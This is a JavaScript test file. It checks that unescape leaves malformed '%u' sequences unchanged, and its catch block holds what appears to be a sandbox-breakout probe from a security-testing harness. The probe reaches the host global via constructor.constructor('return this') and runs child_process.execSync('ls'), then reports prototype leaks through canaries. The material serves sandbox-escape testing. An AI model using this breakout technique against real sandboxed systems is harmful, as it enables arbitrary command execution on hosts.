try {
    assert.sameValue(unescape('%u000%0'), '%u000%0');
    assert.sameValue(unescape('%u000g0'), '%u000g0');
    assert.sameValue(unescape('%u000G0'), '%u000G0');
    assert.sameValue(unescape('%u00g00'), '%u00g00');
    assert.sameValue(unescape('%u00G00'), '%u00G00');
    assert.sameValue(unescape('%u0g000'), '%u0g000');
    assert.sameValue(unescape('%u0G000'), '%u0G000');
    assert.sameValue(unescape('%ug0000'), '%ug0000');
    assert.sameValue(unescape('%uG0000'), '%uG0000');
    assert.sameValue(unescape('%u000u0'), '%u000u0');
    assert.sameValue(unescape('%u000U0'), '%u000U0');
    assert.sameValue(unescape('%u00u00'), '%u00u00');
    assert.sameValue(unescape('%u00U00'), '%u00U00');
    assert.sameValue(unescape('%u0u000'), '%u0u000');
    assert.sameValue(unescape('%u0U000'), '%u0U000');
    assert.sameValue(unescape('%uu0000'), '%uu0000');
    assert.sameValue(unescape('%uU0000'), '%uU0000');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}